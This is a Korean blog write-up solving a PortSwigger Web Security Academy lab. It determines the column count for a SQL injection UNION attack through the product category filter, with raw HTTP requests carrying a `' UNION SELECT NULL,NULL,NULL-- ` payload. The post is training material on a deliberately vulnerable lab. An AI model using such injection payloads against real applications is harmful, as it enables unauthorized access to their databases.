---
layout: post
title: "Burp Academy 문제풀이 - SQL injection UNION attack, determining the number of columns returned by the query"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, SQL인젝션]
toc: true
---

# 개요
- SQL 인젝션 문제이다. 
- 문제 주소: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
- SQL 인젝션 설명 주소: https://portswigger.net/web-security/sql-injection
- 난이도: PRACTITIONER (중간)

# 문제 분석
```
This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.
```

- 상품 카테고리 필터에 SQL인젝션(이하 SQLi) 취약점이 있다고 한다. 
- UNION 을 사용해 null 값을 포함한 row를 추가하면 될 것 같다.
- 문제 이름에도 나와있지만 UNION 을 이용할 때 중요한 것은 원래 서버에서 실행하는 쿼리와 UNION으로 추가하는 쿼리에서 조회하는 칼럼수가 일치해야 한다는 점이다. 
- 일치하지 않으면 SQL 에러가 발생할 것이고, 일치하면 실행이 성공할 것이다. 



# SQLi 가능한 곳 찾기 

![상품 카테고리 검색](/images/burp-academy-sqli-3-1.png)

카테고리 링크를 클릭했을 때 다음 요청이 전송된다. 이 요청의 `category` 파라메터에 취약점이 있는 것으로 보인다. 
```
GET /filter?category=Food+%26+Drink HTTP/1.1
Host: 0a4e0059040befe9c2920c7a008b00a1.web-security-academy.net
Cookie: session=LIh6LwPZfLRbtdrxNCePKX1yUiHlRjHL
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4e0059040befe9c2920c7a008b00a1.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Connection: close
```



# 풀이 
- 위의 쿼리에서 `UNION SELECT NULL-- `를 기본으로 칼럼을 하나씩 추가해가면서 테스트해본다. 
- `UNION SELECT NULL,NULL-- `, `UNION SELECT NULL,NULL,NULL-- ` 과 같은 식이다. 
- 칼럼 수가 세개일 때 200응답이 돌아왔다. 

```
GET /filter?category=Food+%26+Drink'%20UNION%20SELECT%20NULL,NULL,NULL--%20 HTTP/1.1
Host: 0a4e0059040befe9c2920c7a008b00a1.web-security-academy.net
Cookie: session=LIh6LwPZfLRbtdrxNCePKX1yUiHlRjHL
Sec-Ch-Ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4e0059040befe9c2920c7a008b00a1.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Connection: close
```


![SQLi 요청,응답 화면](/images/burp-academy-sqli-3-2.png)

![SQLi 성공](/images/burp-academy-sqli-3-success.png)